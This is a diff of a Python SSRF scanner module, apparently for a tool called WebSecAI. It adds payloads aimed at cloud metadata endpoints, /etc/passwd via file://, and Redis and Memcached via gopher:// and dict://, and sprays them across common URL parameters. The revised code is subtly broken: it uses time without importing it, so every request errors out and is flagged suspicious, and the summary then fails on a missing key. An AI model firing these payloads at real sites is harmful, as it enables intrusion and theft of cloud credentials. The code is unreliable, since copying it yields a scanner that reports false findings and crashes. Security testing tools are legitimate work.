@@ -1,76 +1,76 @@
 import requests
+from urllib.parse import urlencode
 
-# Частые SSRF-цели для простых проверок
-SSRF_TEST_TARGETS = [
-    "http://127.0.0.1:80",
-    "http://localhost:80",
-    "http://169.254.169.254",  # метаданные облака
+# 🆕 Полный SSRF payload set
+SSRF_TARGETS = [
+    # Basic internal
+    "http://127.0.0.1:22", "http://localhost/admin",
+    "http://169.254.169.254/latest/meta-data/",  # AWS/GCP/Azure
+    
+    # Bypass tricks
+    "http://127.0.0.1.nip.io/", "http://localhost.", 
+    "http://0/", "http://0.0.0.0:80",
+    
+    # Protocols
+    "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO",
+    "dict://127.0.0.1:11211/info", "ftp://127.0.0.1:21"
 ]
 
+PARAMS = ["url", "redirect", "target", "next", "u", "file", "image", "callback", "include"]
 
 def scan_ssrf_basic(url: str):
-    """
-    Простейшая эвристика SSRF:
-    подставляем внутренние URL в типичный параметр (?url= / ?redirect= / ?target=)
-    и смотрим, отражается ли внутренний адрес/ответ.
-    Возвращает список попыток с флагом подозрительности.
-    """
-    param_names = ["url", "redirect", "target", "next", "u"]
     results = []
-
-    for param in param_names:
-        for test_target in SSRF_TEST_TARGETS:
-            test_url = f"{url}?{param}={test_target}"
-            print(f"[*] SSRF check: {test_url}")
-
+    
+    for param in PARAMS:
+        for target in SSRF_TARGETS:
+            # URL encode + bypass
+            encoded = requests.utils.quote(target, safe='/:')
+            test_url = f"{url}?{urlencode({param: encoded})}"
+            
+            print(f"[*] SSRF: {param}={target[:30]}...")
+            
             try:
-                resp = requests.get(test_url, timeout=10)
-            except requests.RequestException as exc:
-                print(f"[!] Не удалось открыть {test_url}: {exc}")
+                t0 = time.time()
+                resp = requests.get(test_url, timeout=6, allow_redirects=False)
+                elapsed = time.time() - t0
+                
+                # 🆕 Blind SSRF detection
+                suspicious = (
+                    # 1. Reflection
+                    any(t in resp.text.lower() for t in ["localhost", "127.0.0", "metadata", "passwd"]) or
+                    
+                    # 2. Time delay (internal connect)
+                    elapsed > 3.0 or
+                    
+                    # 3. Different status/length
+                    resp.status_code not in [200, 404] or
+                    len(resp.text) < 100  # Empty/internal pages
+                )
+                
                 results.append({
                     "param": param,
-                    "payload": test_target,
-                    "tested_url": test_url,
-                    "error": str(exc),
-                    "suspicious": False,
+                    "target": target,
+                    "status": resp.status_code,
+                    "time": f"{elapsed:.1f}s",
+                    "suspicious": suspicious
                 })
-                continue
-
-            body_lower = resp.text.lower()
-            suspicious = (
-                "localhost" in body_lower
-                or "127.0.0.1" in body_lower
-                or "169.254.169.254" in body_lower
-                or "internal" in body_lower
-            )
-
-            if suspicious:
-                print(f"[!] Возможная SSRF-уязвимость: параметр '{param}', payload '{test_target}'")
-            else:
-                print(f"[+] SSRF-признаков не найдено для параметра '{param}' и payload '{test_target}'.")
-
-            results.append({
-                "param": param,
-                "payload": test_target,
-                "tested_url": test_url,
-                "status_code": resp.status_code,
-                "suspicious": suspicious,
-            })
-
+                
+            except Exception as e:
+                results.append({"param": param, "error": str(e), "suspicious": True})
+    
     return results
 
-
 def scan_ssrf(url: str) -> bool:
-    """
-    Обёртка для основного сканера WebSecAI:
-    возвращает True, если хотя бы одна попытка выглядит подозрительно.
-    """
+    print(f"🔍 SSRF scan: {url}")
     results = scan_ssrf_basic(url)
-    any_suspicious = any(r.get("suspicious") for r in results)
-
-    if any_suspicious:
-        print("[!] Итог: обнаружены потенциальные признаки SSRF (по эвристике).")
-    else:
-        print("[+] Итог: явных признаков SSRF не найдено.")
-
-    return any_suspicious
+    
+    suspicious = [r for r in results if r.get("suspicious")]
+    
+    if suspicious:
+        print(f"🟠 SSRF vectors: {len(suspicious)}")
+        for r in suspicious[:3]:
+            print(f"  → {r['param']}={r['target'][:20]}... ({r.get('status', '-')})")
+        return True
+    
+    print("🟢 SSRF clean")
+    return False
